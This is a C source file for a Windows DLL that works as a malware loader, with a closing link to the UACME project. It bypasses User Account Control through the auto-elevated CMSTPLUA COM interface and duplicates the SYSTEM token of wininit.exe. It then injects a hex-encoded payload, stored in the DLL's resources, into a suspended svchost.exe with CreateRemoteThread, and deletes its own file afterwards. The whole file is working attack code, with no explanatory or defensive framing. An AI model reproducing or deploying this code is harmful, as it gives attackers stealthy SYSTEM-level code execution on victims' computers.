#include <stdio.h>
#include <process.h>
#include <windows.h>
#include <tlhelp32.h>

#define T_IID_ICMLuaUtil L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}"
#define T_CLSID_CMSTPLUA L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
#define T_ELEVATION_MONIKER_ADMIN L"Elevation:Administrator!new:"

static HINSTANCE DllHinst;

static wchar_t PWD[MAX_PATH];

typedef interface ICMLuaUtil {
  struct ICMLuaUtilVtbl *lpVtbl;
} ICMLuaUtil;

struct ICMLuaUtilVtbl {

  BEGIN_INTERFACE

  HRESULT(STDMETHODCALLTYPE *QueryInterface)
  (__RPC__in ICMLuaUtil *This, __RPC__in REFIID riid,
   _COM_Outptr_ void **ppvObject);

  ULONG(STDMETHODCALLTYPE *AddRef)(__RPC__in ICMLuaUtil *This);

  ULONG(STDMETHODCALLTYPE *Release)(__RPC__in ICMLuaUtil *This);

  // incomplete definition
  HRESULT(STDMETHODCALLTYPE *SetRasCredentials)(__RPC__in ICMLuaUtil *This);

  // incomplete definition
  HRESULT(STDMETHODCALLTYPE *SetRasEntryProperties)(__RPC__in ICMLuaUtil *This);

  // incomplete definition
  HRESULT(STDMETHODCALLTYPE *DeleteRasEntry)(__RPC__in ICMLuaUtil *This);

  // incomplete definition
  HRESULT(STDMETHODCALLTYPE *LaunchInfSection)(__RPC__in ICMLuaUtil *This);

  // incomplete definition
  HRESULT(STDMETHODCALLTYPE *LaunchInfSectionEx)(__RPC__in ICMLuaUtil *This);

  // incomplete definition
  HRESULT(STDMETHODCALLTYPE *CreateLayerDirectory)(__RPC__in ICMLuaUtil *This);

  HRESULT(STDMETHODCALLTYPE *ShellExec)
  (__RPC__in ICMLuaUtil *This, _In_ LPCWSTR lpFile,
   _In_opt_ LPCWSTR lpParameters, _In_opt_ LPCWSTR lpDirectory,
   _In_ ULONG fMask, _In_ ULONG nShow);

  HRESULT(STDMETHODCALLTYPE *SetRegistryStringValue)
  (__RPC__in ICMLuaUtil *This, _In_ HKEY hKey, _In_opt_ LPCTSTR lpSubKey,
   _In_opt_ LPCTSTR lpValueName, _In_ LPCTSTR lpValueString);

  HRESULT(STDMETHODCALLTYPE *DeleteRegistryStringValue)
  (__RPC__in ICMLuaUtil *This, _In_ HKEY hKey, _In_ LPCTSTR lpSubKey,
   _In_ LPCTSTR lpValueName);

  // incomplete definition
  HRESULT(STDMETHODCALLTYPE *DeleteRegKeysWithoutSubKeys)
  (__RPC__in ICMLuaUtil *This);

  // incomplete definition
  HRESULT(STDMETHODCALLTYPE *DeleteRegTree)(__RPC__in ICMLuaUtil *This);

  HRESULT(STDMETHODCALLTYPE *ExitWindowsFunc)(__RPC__in ICMLuaUtil *This);

  // incomplete definition
  HRESULT(STDMETHODCALLTYPE *AllowAccessToTheWorld)(__RPC__in ICMLuaUtil *This);

  // incomplete definition
  HRESULT(STDMETHODCALLTYPE *CreateFileAndClose)(__RPC__in ICMLuaUtil *This);

  // incomplete definition
  HRESULT(STDMETHODCALLTYPE *DeleteHiddenCmProfileFiles)
  (__RPC__in ICMLuaUtil *This);

  // incomplete definition
  HRESULT(STDMETHODCALLTYPE *CallCustomActionDll)(__RPC__in ICMLuaUtil *This);

  HRESULT(STDMETHODCALLTYPE *RunCustomActionExe)
  (__RPC__in ICMLuaUtil *This, _In_ LPCTSTR lpFile,
   _In_opt_ LPCTSTR lpParameters, _COM_Outptr_ LPCTSTR *pszHandleAsHexString);

  // incomplete definition
  HRESULT(STDMETHODCALLTYPE *SetRasSubEntryProperties)
  (__RPC__in ICMLuaUtil *This);

  // incomplete definition
  HRESULT(STDMETHODCALLTYPE *DeleteRasSubEntry)(__RPC__in ICMLuaUtil *This);

  // incomplete definition
  HRESULT(STDMETHODCALLTYPE *SetCustomAuthData)(__RPC__in ICMLuaUtil *This);

  END_INTERFACE
};

static void ucmAllocateElevatedObject(void **ppv) {
  wchar_t szMoniker[MAX_PATH] = {0};
  wcscpy(szMoniker, T_ELEVATION_MONIKER_ADMIN);
  wcscat(szMoniker, T_CLSID_CMSTPLUA);

  IID riid = {0};
  IIDFromString(T_IID_ICMLuaUtil, &riid);

  BIND_OPTS3 bop = {0};
  bop.cbStruct = sizeof(bop);
  bop.dwClassContext = CLSCTX_LOCAL_SERVER;

  CoGetObject(szMoniker, (BIND_OPTS *)&bop, &riid, ppv);
}

static char *convert(int *rawSize, const char *text) {
  int textSize = strlen(text);
  *rawSize = textSize / 2;
  char *raw = malloc(*rawSize);

  for (int i = 0; i < textSize; i += 2) {
    sscanf(text + i, "%2x", (int *)&raw[i / 2]);
  }

  return raw;
}

static char *readResource(int *rawSize) {
  char *text = NULL;
  for (int i = 0, len = 0; i < 50; i++) {
    char *res = LoadResource(DllHinst, FindResource(DllHinst, MAKEINTRESOURCE(i), RT_RCDATA));
    len += strlen(res);
    text = realloc(text, len + 1);
    text[len] = 0;

    if (i == 0) {
      strcpy(text, res);
    } else {
      strcat(text, res);
    }
  }

  char *raw = convert(rawSize, text);
  free(text);

  return raw;
}

static int getPID() {
  int pid = 0;
  HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  PROCESSENTRY32 process;
  process.dwSize = sizeof(PROCESSENTRY32);
  while (Process32Next(hProcessSnap, &process)) {
    if (strcmp(process.szExeFile, "wininit.exe") == 0) {
      pid = process.th32ProcessID;
      break;
    }
  }
  CloseHandle(hProcessSnap);
  return pid;
}

int enigma() {
  int rawSize;
  char *raw = readResource(&rawSize);

  HANDLE hToken = 0;
  HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, getPID());
  OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken);

  HANDLE hDuplicateToken = 0;
  DuplicateTokenEx(hToken,
                   TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY |
                       TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
                   0, SecurityImpersonation, TokenPrimary, &hDuplicateToken);

  STARTUPINFOW si = {0};
  PROCESS_INFORMATION pi = {0};
  CreateProcessWithTokenW(hDuplicateToken, LOGON_WITH_PROFILE, L"svchost.exe",
                          0, CREATE_SUSPENDED, 0, PWD, &si, &pi);

  void *ptr = VirtualAllocEx(pi.hProcess, 0, rawSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(pi.hProcess, ptr, raw, rawSize, 0);
  CreateRemoteThread(pi.hProcess, 0, 0, ptr, 0, 0, 0);

  free(raw);

  char args[MAX_PATH], path[MAX_PATH];
  GetModuleFileName(DllHinst, path, MAX_PATH);
  sprintf(args, "/c del \"%s\"", path);
  spawnlp(P_OVERLAY, "cmd", args, NULL);

  return 0;
}

int main() {
  CoInitialize(0);

  ICMLuaUtil *CMLuaUtil;
  ucmAllocateElevatedObject((void **)&CMLuaUtil);

  wchar_t args[MAX_PATH], path[MAX_PATH];
  GetModuleFileNameW(DllHinst, path, MAX_PATH);
  swprintf(args, MAX_PATH, L"\"%s\" enigma", path);
  CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, L"rundll32", args, PWD, 0, SW_HIDE);

  CMLuaUtil->lpVtbl->Release(CMLuaUtil);
  CoUninitialize();
  return 0;
}

int msg() {
  puts("stub");
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
  switch (reason) {
  case DLL_PROCESS_ATTACH:
    DllHinst = hinst;
    GetCurrentDirectoryW(MAX_PATH, PWD);
    break;
  case DLL_THREAD_ATTACH:
  case DLL_THREAD_DETACH:
  case DLL_PROCESS_DETACH:
    break;
  }
  return TRUE;
}

/*
https://github.com/hfiref0x/UACME/blob/master/Source/Akagi/methods/api0cradle.c
*/
